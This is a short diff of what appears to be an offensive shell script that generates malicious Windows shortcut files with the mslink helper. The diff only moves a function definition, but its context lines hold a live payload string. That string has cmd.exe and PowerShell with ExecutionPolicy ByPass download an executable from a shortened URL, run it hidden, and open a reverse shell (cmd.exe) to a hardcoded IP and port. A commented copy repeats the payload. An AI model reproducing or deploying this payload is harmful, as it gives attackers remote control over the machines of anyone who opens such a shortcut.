@@ -6,6 +6,9 @@
 
 trap 'printf "\n";stop' 2
 
+
+mslink() {
+
 serveo_ip="159.89.214.31"
 IS_PRINTER_LNK=0
 cmd="C:\Windows\System32\cmd.exe /c echo (wget 'https://tinyurl.com/y88r9epk' -OutFile a.exe) > b.ps1 & powershell -ExecutionPolicy ByPass -File b.ps1 & START /MIN a.exe $serveo_ip $serveo_port -e cmd.exe -d ^& exit"
@@ -13,8 +16,6 @@ LNK_TARGET="$cmd"
 OUTPUT_FILE="$lnkname.lnk"
 
 #param_HasArguments="'/c echo (wget 'https://tinyurl.com/y88r9epk' -OutFile a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1 & START /MIN a.exe $serveo_ip $serveo_port -e cmd.exe -d ^& exit^"
-
-mslink() {
 
 # mslink: Allow to create Windows Shortcut without the need of Windows
 # 
